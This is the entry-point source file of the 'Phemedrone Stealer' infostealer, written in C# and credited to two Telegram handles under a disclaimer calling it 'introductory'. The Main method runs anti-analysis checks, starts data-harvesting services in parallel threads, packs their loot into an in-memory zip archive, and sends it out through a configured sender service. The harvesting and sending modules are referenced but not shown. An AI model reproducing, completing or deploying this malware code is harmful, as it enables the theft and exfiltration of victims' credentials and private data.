/*
    Phemedrone Stealer
    Coded by https://t.me/webster480 & https://t.me/TheDyer
    !WARNING! ALL CODE IS FOR INTRODUCTORY PURPOSES WE ARE NOT RESPONSIBLE FOR WHAT YOU HAVE DONE !WARNING!
*/
using System.IO;
using System.Linq;
using System.Threading;
using Phemedrone.Extensions;

namespace Phemedrone
{
    internal static class Program
    {
        public static void Main()
        {
            Protections.CheckAll.Check();
            var ms = new MemoryStream();
            using (var zip = ZipStorage.Create(ms))
            {
                RuntimeResolver.GetInheritedClasses<IService>()
                    .GroupBy(s => s.Priority)
                    .Select(s => s.ToList())
                    .ToList().ForEach(s =>
                    {
                        var threads = s.Select(service => new Thread(service.Run)).ToList();
                        threads.ForEach(t => t.Start());
                        threads.ForEach(t => t.Join());
                        s.ForEach(service =>
                        {
                            IService.AddRecords(service.Entries, zip);
                            service.Dispose();
                        });
                    });
                IService.AddRecords(ServiceCounter.Finalize(), zip);
            }
            
            Config.SenderService.Send(ms.ToArray());
        }
    }
}